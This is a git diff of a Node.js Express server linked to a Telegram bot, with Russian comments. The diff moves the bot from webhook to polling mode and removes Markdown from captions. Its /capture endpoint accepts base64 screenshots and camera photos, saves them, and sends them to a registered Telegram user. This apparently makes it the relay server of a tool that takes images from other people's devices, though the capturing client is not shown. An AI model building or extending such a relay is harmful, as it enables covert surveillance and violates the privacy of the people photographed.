@@ -91,8 +91,7 @@ app.post('/capture', (req, res) => {
         fs.writeFileSync(filepath, Buffer.from(image, 'base64'));
 
         bot.telegram.sendPhoto(userId, { source: filepath }, {
-            caption: 'Фото: ' + (type === 'screenshot' ? 'Скриншот' : 'Камера') + '\nВремя: ' + new Date(timestamp).toLocaleString('ru-RU'),
-            parse_mode: 'Markdown'
+            caption: 'Фото: ' + (type === 'screenshot' ? 'Скриншот' : 'Камера') + '\nВремя: ' + new Date(timestamp).toLocaleString('ru-RU')
         }).catch(function() {});
 
         res.json({ status: 'ok' });
@@ -111,29 +110,15 @@ app.post('/register', (req, res) => {
     }
 });
 
-// ---------- ВЕБХУК (вместо bot.launch()) ----------
-// Эндпоинт для вебхука
-app.post('/webhook', (req, res) => {
-    bot.handleUpdate(req.body, res);
-});
+// ---------- ЗАПУСК ----------
+// Удалить вебхук при старте (чтобы не было конфликтов)
+bot.telegram.deleteWebhook({ drop_pending_updates: true }).catch(() => {});
 
-// Удалить старый вебхук и установить новый
-bot.telegram.deleteWebhook({ drop_pending_updates: true })
-    .then(() => {
-        console.log('Old webhook deleted');
-        const webhookUrl = process.env.RENDER_EXTERNAL_URL + '/webhook';
-        return bot.telegram.setWebhook(webhookUrl);
-    })
-    .then(() => {
-        console.log('Webhook set successfully');
-    })
-    .catch((err) => {
-        console.error('Webhook error:', err.message);
-    });
+// Запуск polling
+bot.launch();
 
 // Запуск Express сервера
 const PORT = process.env.SERVER_PORT || 3000;
 app.listen(PORT, function() {
-    console.log('Server started on port ' + PORT);
-    console.log('Webhook URL: ' + process.env.RENDER_EXTERNAL_URL + '/webhook');
+    console.log('Bot started on port ' + PORT);
 });
